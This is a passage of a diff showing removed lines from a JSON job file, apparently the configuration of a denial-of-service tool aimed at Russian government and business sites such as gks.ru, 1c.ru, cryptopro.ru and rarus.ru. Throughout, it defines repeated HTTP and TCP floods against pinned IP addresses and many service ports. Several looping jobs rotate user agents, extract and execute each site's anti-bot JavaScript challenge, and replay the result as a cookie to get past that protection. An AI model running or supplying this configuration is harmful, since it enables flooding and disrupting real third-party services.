-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://websbor.gks.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://online.gks.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://online.gks.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://online.gks.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "83.229.254.40:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://nfo-report.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.115:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://nfo-report.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.115:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://downloads.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.210:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://downloads.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.210:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:21",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:22",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:25",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:53",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://downloads.v8.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.124:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:110",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:139",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://downloads.v8.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.124:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:465",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:543",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:993",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:1433",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:3306",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:3389",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:5060",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:8000",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://downloads.v8.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.124:8080",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "tcp",
-            "count": 5,
-            "args":
-            {
-                "address": "185.12.155.124:8433",
-                "body": "{{ random_payload 10 }}",
-                "interval_ms": 1
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://login.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.29:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://login.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.29:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://reputils.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.21:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://reputils.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.21:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://regservice.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.152.27:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://regservice.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.152.27:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://torg.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.12:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://torg.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.12:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://online.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.229:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://online.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.229:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://its.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.120:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://its.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.12.155.120:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://v8.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.230:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://v8.1c.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.230:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://www.cryptopro.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "178.248.239.130:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://www.cryptopro.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "178.248.239.130:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "loop",
-            "args":
-            {
-                "job":
-                {
-                    "type": "discard-error",
-                    "args":
-                    {
-                        "job":
-                        {
-                            "type": "timeout",
-                            "args":
-                            {
-                                "timeout": "1h",
-                                "job":
-                                {
-                                    "type": "sequence",
-                                    "args":
-                                    {
-                                        "jobs":
-                                        [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args":
-                                                {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args":
-                                                {
-                                                    "request":
-                                                    {
-                                                        "method": "GET",
-                                                        "path": "https://www.cryptopro.ru/",
-                                                        "headers":
-                                                        {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args":
-                                                {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args":
-                                                {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args":
-                                                {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args":
-                                                {
-                                                    "jobs":
-                                                    [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 7,
-                                                            "args":
-                                                            {
-                                                                "request":
-                                                                {
-                                                                    "method": "GET",
-                                                                    "path": "https://www.cryptopro.ru/",
-                                                                    "headers":
-                                                                    {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies":
-                                                                    {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "http://getserial.infotecs.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.77:80",
-                        "is_tls": "false"
-                    }
-                }
-            }
-        },
-        {
-            "type": "http",
-            "count": 5,
-            "args":
-            {
-                "request":
-                {
-                    "method": "GET",
-                    "path": "https://getserial.infotecs.ru"
-                },
-                "client":
-                {
-                    "static_host":
-                    {
-                        "addr": "185.169.155.77:443",
-                        "is_tls": "true"
-                    }
-                }
-            }
-        },
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://rarus.ru",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://rarus.ru",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://rhelper.rarus.ru",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://rhelper.rarus.ru",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        },        
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://update.rarus.ru/public",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://update.rarus.ru/public",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }, 
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://techlab.rarus.ru",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://techlab.rarus.ru",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        }, 
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://bo.rarus.ru",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://bo.rarus.ru",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "loop",
-            "args": {
-                "job": {
-                    "type": "discard-error",
-                    "args": {
-                        "job": {
-                            "type": "timeout",
-                            "args": {
-                                "timeout": "1h",
-                                "job": {
-                                    "type": "sequence",
-                                    "args": {
-                                        "jobs": [
-                                            {
-                                                "type": "set-value",
-                                                "name": "useragent",
-                                                "args": {
-                                                    "value": "{{ random_user_agent }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "http-request",
-                                                "name": "initial",
-                                                "args": {
-                                                    "request": {
-                                                        "method": "GET",
-                                                        "path": "https://pos.rarus.ru",
-                                                        "headers": {
-                                                            "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}",
-                                                            "Accept": "text/html",
-                                                            "Accept-Language": "en-US",
-                                                            "Connection": "keep-alive"
-                                                        }
-                                                    }
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "source",
-                                                "args": {
-                                                    "value": "{{ index (.Value (ctx_key \"data.initial\")) \"response\" \"body\" }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "set-value",
-                                                "name": "extract-script",
-                                                "args": {
-                                                    "value": "{{ index (split (index (split (.Value (ctx_key \"data.source\")) \"function() {\") 1) \"var config\") 0 }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "js",
-                                                "name": "exec-script",
-                                                "args": {
-                                                    "script": "{{ .Value (ctx_key \"data.extract-script\") }}"
-                                                }
-                                            },
-                                            {
-                                                "type": "parallel",
-                                                "args": {
-                                                    "jobs": [
-                                                        {
-                                                            "type": "http",
-                                                            "count": 5,
-                                                            "args": {
-                                                                "request": {
-                                                                    "method": "GET",
-                                                                    "path": "https://pos.rarus.ru",
-                                                                    "headers": {
-                                                                        "User-Agent": "{{ .Value (ctx_key \"data.useragent\") }}"
-                                                                    },
-                                                                    "cookies": {
-                                                                        "_pcl": "{{ .Value (ctx_key \"data.exec-script\") }}"
-                                                                    }
-                                                                }
-                                                            }
-                                                        }
-                                                    ]
-                                                }
-                                            }
-                                        ]
-                                    }
-                                }
-                            }
-                        }
-                    }
-                }
-            }
-        },
-        {
-            "type": "encrypted",
-            "count": 7,
-            "args":
-            {
-                "format": "json",
